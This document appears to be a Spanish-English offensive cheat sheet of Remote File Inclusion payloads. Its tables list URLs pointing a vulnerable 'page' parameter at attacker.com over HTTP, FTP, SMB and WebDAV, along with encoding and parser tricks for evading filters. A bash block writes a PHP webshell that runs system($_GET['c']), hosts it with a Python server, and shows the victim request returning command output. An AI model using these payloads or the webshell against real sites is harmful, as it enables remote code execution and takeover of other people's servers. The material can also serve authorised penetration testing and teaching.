---
aliases:
  - RFI HTTP
  - RFI HTTPS
  - RFI FTP
  - RFI Schemes
tags:
  - type/cheatsheet
  - vuln/rfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Remote File Inclusion (RFI)]]'
---
# RFI - Vectores Básicos

***

## HTTP / HTTPS Remote Inclusion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| HTTP basic | `?page=http://attacker.com/shell.php` | Standard. |
| HTTPS | `?page=https://attacker.com/shell.php` | TLS — bypass HTTP filters / IDS. |
| Custom port | `?page=http://attacker.com:8080/shell.php` | Non-standard ports. |
| With path | `?page=http://attacker.com/dir/shell.php` | Subdirectory. |
| With query string | `?page=http://attacker.com/shell.php?cmd=id` | Pass args to shell. |
| `.txt` extension | `?page=http://attacker.com/shell.txt` | Sometimes server still includes con .txt. |
| Different filename | Avoid `.php` if filtered | Bypass. |
| Polyglot file | File con multiple format magic bytes | Combine. |
| Server-controlled response | Atacante's server serves PHP based on User-Agent | Conditional payload. |
| Force MIME type | Atacante sets `Content-Type: application/x-php` | Edge. |
| HTTP redirect chain | URL redirects a final payload | Open Redirect chain. |
| Custom Host header | `?page=http://attacker.com:80/shell.php` | Standard. |
^rfi-vector-http

### Setup atacante HTTP server

```bash
# Atacante hostea webshell
mkdir /tmp/rfi
cat > /tmp/rfi/shell.php <<'EOF'
<?php
if(isset($_GET['c'])) {
    system($_GET['c']);
}
?>
EOF

# Quick HTTP server
cd /tmp/rfi && python3 -m http.server 80

# Victim:
# https://target/index.php?page=http://attacker.com/shell.php&c=id
# Response includes: uid=33(www-data) ...
```

___

## FTP / SMB Schemes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| FTP anonymous | `?page=ftp://attacker.com/shell.php` | Anonymous read. |
| FTP authenticated | `?page=ftp://user:pass@attacker.com/shell.php` | Userinfo en URL. |
| FTP active vs passive | Per-server config | Edge. |
| SMB / CIFS | `?page=\\\\attacker.com\\share\\shell.php` | Windows SMB. |
| `smb://` scheme | `?page=smb://attacker.com/share/shell.php` | Linux SMB protocol. |
| `cifs://` | Same family | Edge. |
| SMB null session | If server allows | Anonymous SMB. |
| WebDAV | `?page=http://attacker.com/dav/shell.php` | If WebDAV available. |
| Combine con SMB relay | If victim PHP server bypasses corp firewall | Edge. |
| FTP active mode con NAT | May fail through NAT | Per-network. |
| sftp:// (PHP ssh2 ext) | If SSH2 extension installed | Edge. |
^rfi-vector-ftp

___

## Raw URL Inclusion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Direct URL | `?page=http://attacker.com/x` | Standard. |
| URL sin extension | `?page=http://attacker.com/raw` | If server appends `.php`. |
| URL with `?` to terminate | `?page=http://attacker.com/x?` | App's `.php` becomes query. |
| URL with `#` fragment | `?page=http://attacker.com/x#` | Fragment ignored server-side. |
| URL with `&` | Combine query trick | Edge. |
| Encoded URL | `?page=http%3A%2F%2Fattacker.com%2Fx` | URL-encoded. |
| Doble encoded | `?page=http%253A%252F%252Fattacker.com` | Multi-decode. |
| IP-based URL | `?page=http://12345/x` (numeric IP) | Bypass DNS filter. |
| IPv6 URL | `?page=http://[2001:db8::1]/x` | IPv6 attacker. |
| Custom protocol | App-specific scheme | Edge. |
| URL con userinfo trick | `?page=http://target.com@attacker.com/x` | Parser confusion. |
| Combine con DNS rebinding | TOCTOU DNS | Edge. |
| Combine con Open Redirect | Chain through legit redirect | Standard. |
^rfi-vector-raw

___

## Combine con Local Upload

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Upload PHP en target | Use file upload feature | Standard chain. |
| Upload `.txt` con PHP code | Bypass extension filter | Standard. |
| Reference uploaded file via local path | LFI mode | Same as LFI. |
| Reference uploaded file via remote URL | If atacante's site mirrors target | Edge. |
| Combine con Subdomain Takeover | Atacante owns subdomain → hosts payload there | Compound. |
| Polyglot file upload | File con multiple formats | Multi-vector. |
| Phar polyglot | Phar deserialization combo | Adjacent. |
| Image with PHP | EXIF metadata con PHP | Stealth. |
| Force-include .png | If server includes regardless of extension | Standard. |
| Combine con `data://` | Embed payload directly | Alternative. |
| Cache poisoning combo | Cache poison + RFI | Mass impact. |
| Internal upload + external RFI URL | Stage payload internally, fetch externally | Combine. |
^rfi-vector-local-upload

***
